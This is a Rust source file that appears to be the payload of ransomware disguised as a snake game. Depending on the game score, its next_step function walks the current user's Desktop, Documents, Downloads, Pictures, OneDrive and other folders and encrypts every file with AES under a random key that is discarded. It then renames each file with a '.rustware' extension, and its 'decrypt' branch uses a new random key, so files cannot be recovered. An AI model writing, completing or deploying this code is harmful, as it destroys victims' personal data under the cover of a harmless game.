use libaes::Cipher;
use rand::Rng;

use std::ffi::CString;
use std::ptr;
use std::{
    env,
    fs
};

use windows_sys::{
    core::*, Win32::Foundation::*, Win32::System::Threading::*, Win32::System::WindowsProgramming::*,Win32::System::Diagnostics::Debug::*,Win32::UI::WindowsAndMessaging::*,

};


 static dir_names : [&str; 13] = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];

fn get_username_name() -> String{
unsafe {
        let mut size = 0;
        let retval = GetUserNameA(ptr::null_mut(), &mut size);
        assert_eq!(retval, 0, "Should have failed");

        let mut username = Vec::with_capacity(size as usize);
        let retval = GetUserNameA(username.as_mut_ptr(), &mut size);
        assert_ne!(retval, 0, "Perform better error handling");
        assert!((size as usize) <= username.capacity());
        username.set_len(size as usize);
        username.resize((size - 1) as usize, 0u8);

        // Beware: This leaves the trailing NUL character in the final string,
        // you may want to remove it!
        String::from_utf8(username).unwrap()
    }

}


pub fn execute_additional_code(message: String) {
    let wide_message = to_wide(message);

    unsafe {
        let event = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
        SetEvent(event);
        WaitForSingleObject(event, 0);
        CloseHandle(event);
        MessageBoxW(0, wide_message.as_ptr(), w!("Caption"), MB_OK);
    }
}

fn to_wide(s: String) -> Vec<u16> {
    use std::iter::once;
    s.encode_utf16().chain(once(0)).collect()
}



fn generate_random_key() -> [u8; 16] {
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 16];
    rng.fill(&mut key);
    key
}

fn generate_random_iv() -> [u8; 16] {
    let mut rng = rand::thread_rng();
    let mut iv = [0u8; 16];
    rng.fill(&mut iv);
    iv
}


fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
    let key = generate_random_key();
    let iv = generate_random_iv();
    let cipher = Cipher::new_128(&key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);
            let encrypted = cipher.cbc_encrypt(&iv, &fs::read(file_name).unwrap());
            fs::write(file_name, encrypted).unwrap();
            let new_filename = format!("{}.rustware", file_name);
            fs::rename(file_name, new_filename).unwrap();
        }

        "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(&iv, &fs::read(file_name).unwrap());
            if let Err(err)=fs::write(file_name, decrypted){
                    eprintln!("Error writing to file: {}", err);

                };
            let new_filename = file_name.replace(".rustware", "");
            fs::rename(file_name, new_filename).unwrap();
        }

        _ => {
            println!("[-] Invalid action!");
            return false
        }
    }

    return true;
}

pub fn next_step(score: u32){
let current_score= score;
for dir in dir_names.iter() {
        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(&get_username_name());
        full_path.push_str("\\");
        full_path.push_str(dir.clone());
        full_path.push_str("\\");
        // extract path and call traverse
        let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
        let path_str = full_path.to_str().expect("Conversion to &str failed");
        println!("Path {}",path_str);
        if  let Ok(entries) = fs::read_dir(path_str) {
        let entries = fs::read_dir(path_str).unwrap();

    for raw_entry in entries {
        let entry = raw_entry.unwrap();

        if entry.file_type().unwrap().is_file() {

            println!("File Name: {}", entry.path().display());
            let file_path = entry.path();
            let file_path_str = file_path.to_str();
            if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains(".ini") {
                // Skip files containing "rustware" or "snakegame" in the file path
                continue;
            }
            if current_score <1000{
            encrypt_decrypt(file_path_str.unwrap(),"encrypt");
            }else{

                 encrypt_decrypt(file_path_str.unwrap(),"decrypt");
                }
        }
        }
        }
     else {
     println!("Failed to read directory: {}", path_str);
}
}



}
